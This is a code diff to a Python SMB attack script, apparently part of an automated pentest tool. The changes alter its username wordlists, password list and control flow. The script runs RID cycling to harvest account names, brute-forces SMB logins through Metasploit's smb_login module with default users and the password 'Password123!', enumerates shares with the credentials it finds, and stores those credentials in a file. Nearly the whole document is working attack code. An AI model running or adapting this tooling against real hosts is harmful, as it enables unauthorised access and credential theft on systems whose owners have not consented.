@@ -5,25 +5,17 @@ import os
 
 smb_users = ["admin","user","manager","supervisor","administrator","test","operator","backup","lab","demo","smb"]
 original_users_len = len(smb_users)
-smb_passwords = ["password","admin","administrator","backup","test","lab","demo"]
+smb_passwords = ["Password123!"]
 domain = '.'
 credentials = []
 
 
 def export_wordlists(_smb_users, _smb_paswords):
-    global smb_users
-    if os.path.exists('smb_users.txt'):
-        with open('smb_users.txt', 'r') as file:
-            smb_users += file.readlines()
-            smb_users = list(set(smb_users))
-
-    with open('smb_users.txt', 'a') as file:
+    with open('smb_users.txt', 'w') as file:
         file.write('\n'.join(_smb_users))
         file.close()
-        if (original_users_len != len(_smb_users)):
-            print(f'[!] Exported founded users list to smb_users.txt')
     
-    with open('smb_pass.txt', 'a') as file:
+    with open('smb_pass.txt', 'w') as file:
         file.write('\n'.join(_smb_paswords))
         file.close()
 
@@ -45,16 +37,19 @@ def rid_cycling(target, user="Guest", passw="", domain="."):
         return
     if output:
         if ('USER' in output):
-            rid_cycling_parse(output, cmd)
+            rid_cycling_parse(output, cmd, user, passw)
+
+            log(output, cmd, target, 'msfconsole')
 
 
-def rid_cycling_parse(output, cmd):
+def rid_cycling_parse(output, cmd, user='', passw=''):
     global domain
     global smb_users
 
     print_banner('445')
     print('[!]', cmd)
     printc('[+] RID Cycling Attack to get Usernames', GREEN)
+    print(f'[!] Using these creds: {user} / {passw}')
     print('')
 
     temp_users = []
@@ -69,11 +64,13 @@ def rid_cycling_parse(output, cmd):
             temp_users.append(user)
     if len(temp_users) > 0:
         smb_users += temp_users
+        smb_users = list(set(smb_users))
+        export_wordlists(smb_users, smb_passwords)
 
 
 def bruteforce(target, port):
     global credentials
-    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set SMBDomain {domain};set USER_AS_PASS true;set BLANK_PASSWORDS true;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'
+    cmd = f'msfconsole -q -x "use scanner/smb/smb_login;set rhosts {target};set RPORT {port};set SMBDomain {domain};set USER_AS_PASS true;set BLANK_PASSWORDS false;set PASS_FILE $(pwd)/smb_pass.txt; set USER_FILE $(pwd)/smb_users.txt;set VERBOSE false;run;exit;"'
 
     try:
         output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
@@ -94,6 +91,9 @@ def bruteforce(target, port):
                     if (creds.split(':')[1] == ''): continue
                     printc(f'[+] {creds}', BLUE)
                     credentials.append(creds)
+
+            log(output, cmd, target, 'msfconsole')
+            
     if credentials:
         export_credentials()
 
@@ -115,40 +115,42 @@ def enumerate_shares(target, user='Guest', passw='', domain='.'):
             print('')
             print(output)
 
+            log(output, cmd, target, 'msfconsole')
+
 
 def handle_smb(target, port):
-    # RID CYCLING AS NULL
-    rid_cycling(target, user='')
-    # RID CYCLING AS GUEST
-    if original_users_len == len(smb_users):
+    if not os.path.exists('smb_credentials.txt'):
+        # RID CYCLING AS NULL
+        rid_cycling(target, user='')
+        # RID CYCLING AS GUEST
         rid_cycling(target)
+        # If no usernames where founded, bruteforce with common users and pass
+        export_wordlists(smb_users, smb_passwords)
+        # BRUTEFORCE LOGIN
+        bruteforce(target, port)
 
-    export_wordlists(smb_users, smb_passwords)
-    # BRUTEFORCE LOGIN
-    bruteforce(target, port)
+        # ENUMERATE SHARES
+        # SHARES AS GUEST
+        enumerate_shares(target)
+        # SHARES AS NULL
+        enumerate_shares(target, user='')
 
-    if (original_users_len == len(smb_users)) and (len(credentials)>0):
-        for item in credentials:
-            cred = ''
-            if ('Guest' not in item) and (':' in item):
-                cred = item
-                user, passw = cred.split(':')[:2]
-                rid_cycling(target, user, passw, domain)
-
-    # ENUMERATE SHARES
-    # SHARES AS GUEST
-    enumerate_shares(target)
-    # SHARES AS NULL
-    enumerate_shares(target, user='')
-    # SHARES WITH CREDS
-    if (len(credentials)>0):
-        for cred in credentials:
-            user, passw = cred.split(':')[:2]
-            enumerate_shares(target, user, passw, domain)
+    if os.path.exists('smb_credentials.txt'):
+        global credentials
+        with open('smb_credentials.txt', 'r') as file:
+            credentials = file.readlines()
+        cred = ''
+        if (len(credentials)>0):
+            for cred in credentials:
+                if ('Guest' not in cred) and (':' in cred):
+                    user, passw = cred.split(':')[:2]
+                    # RID CYCLING WITH CREDS
+                    rid_cycling(target, user, passw, domain)
+                    # SHARES WITH CREDS
+                    enumerate_shares(target, user, passw, domain)
 
     try:
-        if (original_users_len != len(smb_users)):
-            os.remove('smb_users.txt')
+        os.remove('smb_users.txt')
         os.remove('smb_pass.txt')
         if not credentials:
             os.remove('smb_credentials.txt')
